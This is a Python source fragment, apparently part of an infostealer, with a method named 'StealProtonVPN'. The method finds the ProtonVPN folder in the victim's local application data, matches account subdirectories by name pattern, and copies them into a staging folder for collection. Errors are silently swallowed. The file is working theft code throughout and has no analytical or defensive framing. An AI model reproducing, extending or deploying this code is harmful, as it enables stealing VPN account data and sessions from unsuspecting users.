
import os
from pathlib import Path
import re
import shutil


async def StealProtonVPN(self, directory_path: str) -> None:
    try:
        protonvpn_folder = os.path.join(self.localappdata, 'ProtonVPN')
        if not os.path.isdir(protonvpn_folder):
            return
        
        async def get_hierarchy(root_dir, pattern):
            return [entry for entry in root_dir.iterdir() if entry.is_dir() and re.match(pattern, entry.name)]
        protonvpn_account = os.path.join(directory_path, "VPN", 'ProtonVPN')
        os.makedirs(protonvpn_account, exist_ok=True)
        pattern = re.compile(r"^ProtonVPN_Url_[A-Za-z0-9]+$")
        directories = await get_hierarchy(Path(protonvpn_folder), pattern)
        for directory in directories:
            destination_path = os.path.join(protonvpn_account, directory.name)
            if directory.is_dir():
                shutil.copytree(directory, destination_path, dirs_exist_ok=True)
            else:
                shutil.copy2(directory, destination_path)
    except Exception as e:
        print(f"proton error - {str(e)}")
        pass